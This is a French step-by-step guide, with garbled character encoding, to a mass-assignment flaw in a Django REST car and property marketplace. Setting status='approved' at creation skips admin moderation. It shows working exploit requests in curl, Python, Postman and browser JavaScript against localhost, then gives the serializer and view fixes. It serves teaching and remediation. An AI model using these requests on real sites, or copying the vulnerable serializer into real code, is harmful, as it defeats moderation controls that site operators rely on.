# üì∑ Guide Complet de la Vuln√©rabilit√© avec Images

## üìã Table des Mati√®res

1. [Objectif Principal du Site Web](#objectif-principal-du-site-web)
2. [Explication de la Vuln√©rabilit√©](#explication-de-la-vuln√©rabilit√©)
3. [Comment Utiliser la Vuln√©rabilit√© √âtape par √âtape](#comment-utiliser-la-vuln√©rabilit√©)
4. [Comment Corriger la Vuln√©rabilit√© √âtape par √âtape](#comment-corriger-la-vuln√©rabilit√©)

---

## üéØ Objectif Principal du Site Web

### Vue d'Ensemble

**Marketplace** est une plateforme de commerce √©lectronique permettant aux utilisateurs de publier des annonces pour vendre ou louer des **v√©hicules** (voitures) et des **propri√©t√©s immobili√®res**.

### Fonctionnalit√©s Principales

#### 1. **Syst√®me d'Authentification**
- Inscription avec num√©ro de t√©l√©phone
- Connexion s√©curis√©e avec JWT (JSON Web Tokens)
- Gestion de profil utilisateur avec photo

#### 2. **Gestion des Annonces**
- **Types d'annonces**:
  - Voitures (avec d√©tails: marque, mod√®le, ann√©e, kilom√©trage, etc.)
  - Propri√©t√©s immobili√®res (avec d√©tails: chambres, salles de bain, superficie, etc.)
- **Objectifs**:
  - Vente (`sale`)
  - Location (`rent`)
- **Upload d'images**: Jusqu'√† 10 images par annonce

#### 3. **Syst√®me de Mod√©ration Administrateur**
- **Workflow normal**:
  1. L'utilisateur cr√©e une annonce
  2. L'annonce est sauvegard√©e avec le statut `pending` (en attente)
  3. L'administrateur examine l'annonce dans le Dashboard Admin
  4. L'administrateur approuve (`approved`) ou rejette (`rejected`) l'annonce
  5. Seules les annonces approuv√©es sont visibles publiquement

#### 4. **Types de Publicit√©**
- **Simple**: 25$ de frais de publication
- **Star**: 50$ de frais de publication (mise en avant)

#### 5. **Tableau de Bord**
- **Utilisateur**: Visualise ses propres annonces
- **Administrateur**: G√®re toutes les annonces, approuve/rejette

### Architecture Technique

- **Backend**: Django REST Framework (Python)
- **Frontend**: React + TypeScript
- **Base de donn√©es**: MySQL
- **Authentification**: JWT (JSON Web Tokens)
- **API**: RESTful API

### Flux de Travail Normal

```
Utilisateur ‚Üí Cr√©e annonce ‚Üí Status: "pending"
    ‚Üì
Admin Dashboard ‚Üí Voit annonce en attente
    ‚Üì
Admin ‚Üí Approuve ‚Üí Status: "approved"
    ‚Üì
Annonce visible publiquement sur le site
```

---

## üîì Explication de la Vuln√©rabilit√©

### Description du Probl√®me

**Vuln√©rabilit√©**: Le champ `status` peut √™tre d√©fini directement lors de la cr√©ation d'une annonce via l'API, permettant de contourner le processus d'approbation administrateur.

### Localisation de la Vuln√©rabilit√©

**Fichier**: `BackEnd/listings/serializers.py`  
**Classe**: `ListingCreateSerializer`  
**Ligne**: ~121

### Code Vuln√©rable

```python
class ListingCreateSerializer(serializers.ModelSerializer):
    class Meta:
        model = Listing
        fields = [
            'title', 'description', 'type', 'purpose', 'price', 'currency',
            'location', 'ad_type', 'images', 'car_details', 'property_details',
            'status'  # ‚ö†Ô∏è VULN√âRABLE: Permet la manipulation directe
        ]
```

### Pourquoi C'est Vuln√©rable?

1. **Le champ `status` est inclus** dans les champs autoris√©s du serializer
2. **Aucune validation** n'emp√™che un utilisateur de d√©finir `status="approved"`
3. **Aucune v√©rification de permissions** pour restreindre la modification du statut
4. **Le code accepte directement** la valeur fournie dans `validated_data`

### Impact de la Vuln√©rabilit√©

- ‚úÖ **Contournement du processus de mod√©ration**
- ‚úÖ **Publication directe d'annonces sans approbation**
- ‚úÖ **Possibilit√© de spam ou de contenu inappropri√©**
- ‚úÖ **Perte de contr√¥le qualit√© pour l'administrateur**
- ‚úÖ **Annonces visibles imm√©diatement sans v√©rification**

### Sc√©nario d'Attaque

Un utilisateur malveillant peut:
1. Cr√©er un compte normal
2. Cr√©er une annonce avec `status="approved"` directement
3. L'annonce appara√Æt imm√©diatement sur le site sans mod√©ration
4. L'administrateur ne voit jamais l'annonce dans "Pending"

---

## üöÄ Comment Utiliser la Vuln√©rabilit√© √âtape par √âtape

### ‚úÖ Oui, vous pouvez ajouter des images!

La vuln√©rabilit√© fonctionne avec:
- **Texte uniquement**
- **Texte + Images** (jusqu'√† 10 images)
- **Texte + Images + D√©tails** (voiture/propri√©t√©)

---

### √âtape 1: Obtenir un Token d'Authentification

#### M√©thode 1: Postman

1. **Ouvrir Postman**
2. **Cr√©er une nouvelle requ√™te**
   - M√©thode: `POST`
   - URL: `http://localhost:8000/api/auth/login/`
3. **Headers**:
   ```
   Content-Type: application/json
   ```
4. **Body (raw JSON)**:
   ```json
   {
     "phone": "+22242038210",
     "password": "votre_mot_de_passe"
   }
   ```
5. **Cliquer sur Send**
6. **Copier le token `access`** de la r√©ponse

#### M√©thode 2: cURL

```bash
curl -X POST http://localhost:8000/api/auth/login/ \
  -H "Content-Type: application/json" \
  -d '{
    "phone": "+22242038210",
    "password": "votre_mot_de_passe"
  }'
```

#### M√©thode 3: Python

```python
import requests

response = requests.post(
    "http://localhost:8000/api/auth/login/",
    json={
        "phone": "+22242038210",
        "password": "votre_mot_de_passe"
    }
)

token = response.json()['tokens']['access']
print(f"Token: {token}")
```

---

### √âtape 2: Cr√©er une Annonce avec la Vuln√©rabilit√© (Avec Images)

#### M√©thode 1: Postman (Recommand√©)

1. **Cr√©er une nouvelle requ√™te**
   - M√©thode: `POST`
   - URL: `http://localhost:8000/api/listings/`

2. **Ajouter l'en-t√™te d'authentification**
   - Onglet **Headers**
   - Key: `Authorization`
   - Value: `Bearer VOTRE_TOKEN_ACCESS`

3. **Configurer le Body**
   - Onglet **Body**
   - S√©lectionner **form-data**

4. **Ajouter les champs suivants:**

| Key | Type | Value |
|-----|------|-------|
| `title` | Text | `Voiture de Luxe - Contournement Admin` |
| `description` | Text | `Cette annonce a contourn√© l'approbation admin avec des images!` |
| `type` | Text | `car` |
| `purpose` | Text | `sale` |
| `price` | Text | `50000` |
| `currency` | Text | `AED` |
| `location` | Text | `Dubai` |
| `ad_type` | Text | `simple` |
| **`status`** | **Text** | **`approved`** ‚ö†Ô∏è **CHAMP VULN√âRABLE** |
| `images` | **File** | S√©lectionner image 1 |
| `images` | **File** | S√©lectionner image 2 |
| `images` | **File** | S√©lectionner image 3 |
| `car_details[make]` | Text | `BMW` |
| `car_details[model]` | Text | `X5` |
| `car_details[year]` | Text | `2023` |

**Instructions importantes:**
- Changez le type de `images` de **Text** √† **File**
- Vous pouvez ajouter jusqu'√† 10 images (r√©p√©tez le champ `images`)
- Le champ `status` avec la valeur `approved` contourne l'approbation

5. **Cliquer sur Send**

#### M√©thode 2: Python (Avec Images)

```python
import requests

url = "http://localhost:8000/api/listings/"
token = "VOTRE_TOKEN_ACCESS"

headers = {
    "Authorization": f"Bearer {token}"
}

# Donn√©es textuelles
data = {
    "title": "Voiture de Luxe avec Images",
    "description": "Cette annonce a contourn√© l'approbation admin avec des images!",
    "type": "car",
    "purpose": "sale",
    "price": "50000",
    "currency": "AED",
    "location": "Dubai",
    "ad_type": "simple",
    "status": "approved",  # ‚ö†Ô∏è CHAMP VULN√âRABLE
    "car_details[make]": "BMW",
    "car_details[model]": "X5",
    "car_details[year]": "2023",
    "car_details[mileage]": "5000",
    "car_details[fuel_type]": "petrol",
    "car_details[transmission]": "automatic",
    "car_details[color]": "Black"
}

# Images - Vous pouvez ajouter jusqu'√† 10 images
files = [
    ('images', open('voiture1.jpg', 'rb')),  # Remplacez par le chemin de votre image
    ('images', open('voiture2.jpg', 'rb')),  # Remplacez par le chemin de votre image
    ('images', open('voiture3.jpg', 'rb'))    # Remplacez par le chemin de votre image
]

# Envoyer la requ√™te
response = requests.post(url, headers=headers, data=data, files=files)
print(response.json())

# Fermer les fichiers
for file in files:
    file[1].close()
```

#### M√©thode 3: cURL (Avec Images)

```bash
curl -X POST http://localhost:8000/api/listings/ \
  -H "Authorization: Bearer VOTRE_TOKEN_ACCESS" \
  -F "title=Voiture de Luxe" \
  -F "description=Description avec images" \
  -F "type=car" \
  -F "purpose=sale" \
  -F "price=50000" \
  -F "currency=AED" \
  -F "location=Dubai" \
  -F "ad_type=simple" \
  -F "status=approved" \
  -F "images=@/chemin/vers/voiture1.jpg" \
  -F "images=@/chemin/vers/voiture2.jpg" \
  -F "images=@/chemin/vers/voiture3.jpg" \
  -F "car_details[make]=BMW" \
  -F "car_details[model]=X5" \
  -F "car_details[year]=2023"
```

**Note:** Remplacez `/chemin/vers/` par le chemin r√©el de vos images sur votre ordinateur.

#### M√©thode 4: JavaScript/Browser Console

```javascript
// Obtenir le token
const token = localStorage.getItem('token') || 'VOTRE_TOKEN';

// Cr√©er FormData
const formData = new FormData();

// Donn√©es textuelles
formData.append('title', 'Voiture de Luxe');
formData.append('description', 'Description avec images');
formData.append('type', 'car');
formData.append('purpose', 'sale');
formData.append('price', '50000');
formData.append('currency', 'AED');
formData.append('location', 'Dubai');
formData.append('ad_type', 'simple');
formData.append('status', 'approved');  // ‚ö†Ô∏è CHAMP VULN√âRABLE

// Pour les images - vous avez besoin d'un input file ou File object
// Exemple: si vous avez un input file
const fileInput = document.querySelector('input[type="file"]');
if (fileInput && fileInput.files.length > 0) {
    Array.from(fileInput.files).forEach(file => {
        formData.append('images', file);
    });
}

// Envoyer la requ√™te
fetch('http://localhost:8000/api/listings/', {
    method: 'POST',
    headers: {
        'Authorization': `Bearer ${token}`
    },
    body: formData
})
.then(r => r.json())
.then(data => {
    console.log('‚úÖ Succ√®s!', data);
    console.log('Status:', data.status);
    console.log('Images:', data.images);
});
```

---

### √âtape 3: V√©rifier le Succ√®s

#### 3.1 V√©rifier la R√©ponse

La r√©ponse devrait contenir:
```json
{
  "id": 123,
  "title": "Voiture de Luxe avec Images",
  "status": "approved",  // ‚úÖ Directement approuv√©!
  "images": [
    {
      "id": 1,
      "image_url": "http://localhost:8000/media/listings/voiture1.jpg"
    },
    {
      "id": 2,
      "image_url": "http://localhost:8000/media/listings/voiture2.jpg"
    }
  ],
  "created_at": "2024-01-15T10:30:00Z",
  ...
}
```

#### 3.2 V√©rifier sur le Site

1. Ouvrir le navigateur
2. Aller √†: `http://localhost:5173/` (ou votre URL frontend)
3. **L'annonce devrait appara√Ætre directement sur la page principale avec les images!**
4. **Elle n'appara√Ætra PAS dans "Pending" du Dashboard Admin**

#### 3.3 V√©rifier dans le Dashboard Admin

1. Se connecter en tant qu'admin
2. Aller au Dashboard Admin
3. **L'annonce ne devrait PAS appara√Ætre dans la liste "Pending"**
4. Elle devrait appara√Ætre dans la liste g√©n√©rale avec `status: approved` et toutes les images

---

### Limites des Images

- **Maximum**: 10 images par annonce
- **Taille du fichier**: 10MB par image
- **Types autoris√©s**: JPEG, PNG, WebP
- **Dimensions**: 100x100 √† 5000x5000 pixels

---

### Exemple Complet avec Tous les Champs

**Postman Configuration:**

```
POST http://localhost:8000/api/listings/
Headers: Authorization: Bearer TOKEN
Body (form-data):
  title: Voiture de Luxe BMW X5
  description: Magnifique voiture de luxe en parfait √©tat avec toutes les options
  type: car
  purpose: sale
  price: 150000
  currency: AED
  location: Dubai Marina
  ad_type: star
  status: approved  ‚ö†Ô∏è CHAMP VULN√âRABLE
  images: [FILE] voiture1.jpg
  images: [FILE] voiture2.jpg
  images: [FILE] voiture3.jpg
  car_details[make]: BMW
  car_details[model]: X5
  car_details[year]: 2023
  car_details[mileage]: 5000
  car_details[fuel_type]: petrol
  car_details[transmission]: automatic
  car_details[color]: Black
```

**R√©sultat**: Annonce approuv√©e directement avec 3 images! ‚úÖ

---

## üõ°Ô∏è Comment Corriger la Vuln√©rabilit√© √âtape par √âtape

### Vue d'Ensemble de la Correction

Pour corriger cette vuln√©rabilit√©, nous devons:
1. Retirer le champ `status` des champs autoris√©s
2. Forcer le statut √† `pending` lors de la cr√©ation
3. Ajouter une validation pour rejeter toute tentative
4. V√©rifier les permissions dans les vues

---

### √âtape 1: Retirer le Champ `status` du Serializer

**Fichier**: `BackEnd/listings/serializers.py`  
**Localisation**: Classe `ListingCreateSerializer`, m√©thode `Meta` (ligne ~116)

#### Avant (Vuln√©rable):

```python
class ListingCreateSerializer(serializers.ModelSerializer):
    class Meta:
        model = Listing
        fields = [
            'title', 'description', 'type', 'purpose', 'price', 'currency',
            'location', 'ad_type', 'images', 'car_details', 'property_details',
            'status'  # ‚ö†Ô∏è VULN√âRABLE - Permet la manipulation directe
        ]
```

#### Apr√®s (S√©curis√©):

```python
class ListingCreateSerializer(serializers.ModelSerializer):
    class Meta:
        model = Listing
        fields = [
            'title', 'description', 'type', 'purpose', 'price', 'currency',
            'location', 'ad_type', 'images', 'car_details', 'property_details'
            # 'status' retir√© - ne peut plus √™tre d√©fini lors de la cr√©ation
        ]
```

**Action**: Supprimez `'status'` de la liste des `fields`.

---

### √âtape 2: Forcer le Statut √† `pending` lors de la Cr√©ation

**Fichier**: `BackEnd/listings/serializers.py`  
**Localisation**: M√©thode `create` de `ListingCreateSerializer` (ligne ~124)

#### Avant (Vuln√©rable):

```python
def create(self, validated_data):
    images_data = validated_data.pop('images', [])
    car_details_data = validated_data.pop('car_details', None)
    property_details_data = validated_data.pop('property_details', None)
    
    user = self.context['request'].user
    validated_data['user'] = user
    
    # ‚ö†Ô∏è VULN√âRABILIT√â: Si status est dans validated_data, il sera utilis√©
    listing = Listing.objects.create(**validated_data)
    
    # ... reste du code ...
```

#### Apr√®s (S√©curis√©):

```python
def create(self, validated_data):
    images_data = validated_data.pop('images', [])
    car_details_data = validated_data.pop('car_details', None)
    property_details_data = validated_data.pop('property_details', None)
    
    user = self.context['request'].user
    validated_data['user'] = user
    
    # ‚úÖ S√âCURIS√â: Forcer le statut √† 'pending' toujours
    validated_data['status'] = 'pending'  # Force le statut, ignore toute valeur fournie
    
    listing = Listing.objects.create(**validated_data)
    
    # ... reste du code ...
```

**Action**: Ajoutez `validated_data['status'] = 'pending'` avant `Listing.objects.create()`.

---

### √âtape 3: Ajouter une Validation Suppl√©mentaire

**Fichier**: `BackEnd/listings/serializers.py`  
**Localisation**: Classe `ListingCreateSerializer` (ajouter une nouvelle m√©thode)

#### Code √† Ajouter:

```python
class ListingCreateSerializer(serializers.ModelSerializer):
    # ... autres champs et m√©thodes ...
    
    def validate(self, attrs):
        """Validation globale pour emp√™cher la manipulation du statut."""
        # Si status est pr√©sent dans les donn√©es, le rejeter explicitement
        if 'status' in attrs:
            raise serializers.ValidationError({
                'status': 'Vous ne pouvez pas d√©finir le statut lors de la cr√©ation. Toutes les annonces commencent avec le statut "pending".'
            })
        return attrs
    
    def create(self, validated_data):
        # ... code existant ...
        
        # S'assurer que le statut est toujours 'pending'
        validated_data['status'] = 'pending'
        
        listing = Listing.objects.create(**validated_data)
        # ... reste du code ...
```

**Action**: Ajoutez la m√©thode `validate()` dans la classe `ListingCreateSerializer`.

---

### √âtape 4: V√©rifier les Permissions dans la Vue

**Fichier**: `BackEnd/listings/views.py`  
**Localisation**: Classe `ListingViewSet`, m√©thode `perform_create` (ligne ~84)

#### Avant (Vuln√©rable):

```python
def perform_create(self, serializer):
    """Set the user when creating a listing."""
    serializer.save(user=self.request.user)
```

#### Apr√®s (S√©curis√©):

```python
def perform_create(self, serializer):
    """Cr√©er une annonce et forcer le statut √† 'pending'."""
    # Ignorer toute valeur de status fournie
    serializer.save(
        user=self.request.user,
        status='pending'  # Toujours 'pending' pour les nouveaux utilisateurs
    )
```

**Action**: Modifiez `perform_create` pour forcer `status='pending'`.

---

### √âtape 5: Ajouter une Protection dans la M√©thode `update`

**Fichier**: `BackEnd/listings/views.py`  
**Localisation**: Classe `ListingViewSet` (ajouter une nouvelle m√©thode)

#### Code √† Ajouter:

```python
class ListingViewSet(viewsets.ModelViewSet):
    # ... code existant ...
    
    def perform_update(self, serializer):
        """Mettre √† jour une annonce."""
        instance = serializer.instance
        
        # Seuls les admins peuvent changer le statut
        if 'status' in serializer.validated_data:
            if not self.request.user.is_staff:
                # Retirer le statut des donn√©es valid√©es pour les non-admins
                serializer.validated_data.pop('status')
                raise serializers.ValidationError({
                    'status': 'Seuls les administrateurs peuvent modifier le statut d\'une annonce.'
                })
        
        serializer.save()
```

**Action**: Ajoutez la m√©thode `perform_update` pour prot√©ger les mises √† jour.

---

### √âtape 6: Tester la Correction

#### 6.1 Test avec Postman

1. Cr√©er une requ√™te POST vers `/api/listings/`
2. Ajouter `status: approved` dans le body
3. **R√©sultat attendu**: 
   - Erreur 400 avec message: "Vous ne pouvez pas d√©finir le statut..."
   - OU le statut est ignor√© et reste `pending`

#### 6.2 Test Python

```python
import requests

url = "http://localhost:8000/api/listings/"
token = "VOTRE_TOKEN"

headers = {"Authorization": f"Bearer {token}"}
data = {
    "title": "Test Correction",
    "description": "Test de la correction",
    "type": "car",
    "purpose": "sale",
    "price": "10000",
    "currency": "AED",
    "location": "Dubai",
    "ad_type": "simple",
    "status": "approved"  # Tentative d'exploitation
}

response = requests.post(url, headers=headers, data=data)

# V√©rifier la r√©ponse
if response.status_code == 400:
    print("‚úÖ Vuln√©rabilit√© corrig√©e! Erreur retourn√©e:", response.json())
elif response.status_code == 201:
    listing = response.json()
    if listing['status'] == 'pending':
        print("‚úÖ Vuln√©rabilit√© corrig√©e! Statut forc√© √† 'pending'")
    else:
        print("‚ùå Vuln√©rabilit√© toujours pr√©sente!")
```

#### 6.3 V√©rifier dans la Base de Donn√©es

```python
# Test Django shell
python manage.py shell

from listings.models import Listing

# Cr√©er une annonce via l'API (avec status="approved" dans la requ√™te)
# Puis v√©rifier:
listing = Listing.objects.latest('created_at')
print(f"Status: {listing.status}")  # Devrait √™tre 'pending'
```

---

### √âtape 7: Documentation de S√©curit√©

**Cr√©er un fichier**: `BackEnd/SECURITY_FIX_STATUS.md`

```markdown
# Correction de la Vuln√©rabilit√© de Statut

## Probl√®me Identifi√©
Le champ `status` pouvait √™tre d√©fini directement lors de la cr√©ation d'annonces, permettant de contourner le processus d'approbation administrateur.

## Solution Impl√©ment√©e
1. ‚úÖ Retir√© `status` des champs autoris√©s dans `ListingCreateSerializer`
2. ‚úÖ Forc√© le statut √† `pending` dans la m√©thode `create()`
3. ‚úÖ Ajout√© validation pour rejeter toute tentative de d√©finition du statut
4. ‚úÖ Restreint la modification du statut aux administrateurs uniquement dans `perform_update()`

## Fichiers Modifi√©s
- `BackEnd/listings/serializers.py`
- `BackEnd/listings/views.py`

## Date de Correction
[Date]

## Test√© par
[Nom]

## R√©sultat des Tests
- ‚úÖ Tentative de d√©finition de `status="approved"` rejet√©e
- ‚úÖ Toutes les nouvelles annonces ont `status="pending"`
- ‚úÖ Seuls les admins peuvent modifier le statut
```

---

### R√©sum√© des Corrections

| √âtape | Action | Fichier | Ligne |
|-------|--------|---------|-------|
| 1 | Retirer `status` des champs | `serializers.py` | ~118 |
| 2 | Forcer `status='pending'` | `serializers.py` | ~131 |
| 3 | Ajouter validation | `serializers.py` | Nouveau |
| 4 | V√©rifier permissions cr√©ation | `views.py` | ~84 |
| 5 | V√©rifier permissions mise √† jour | `views.py` | Nouveau |
| 6 | Tester | - | - |
| 7 | Documenter | Nouveau fichier | - |

---

### Checklist de S√©curit√©

- [ ] `status` retir√© de `ListingCreateSerializer.fields`
- [ ] `status` forc√© √† `pending` dans `create()`
- [ ] Validation ajout√©e pour rejeter `status` dans les donn√©es
- [ ] Permissions v√©rifi√©es dans `perform_create()`
- [ ] Permissions v√©rifi√©es dans `perform_update()`
- [ ] Tests effectu√©s et r√©ussis
- [ ] Documentation mise √† jour

---

## üìù Notes Importantes

1. **Apr√®s correction**, toutes les nouvelles annonces auront automatiquement le statut `pending`
2. **Seuls les admins** peuvent changer le statut via le Dashboard Admin
3. **Les utilisateurs normaux** ne peuvent plus contourner le processus d'approbation
4. **Tester** la correction avant de d√©ployer en production
5. **Les images** continuent de fonctionner normalement apr√®s la correction

---

## üîó R√©f√©rences

- [Django REST Framework - Serializers](https://www.django-rest-framework.org/api-guide/serializers/)
- [OWASP - Mass Assignment](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html)
- [Django Security Best Practices](https://docs.djangoproject.com/en/stable/topics/security/)

---


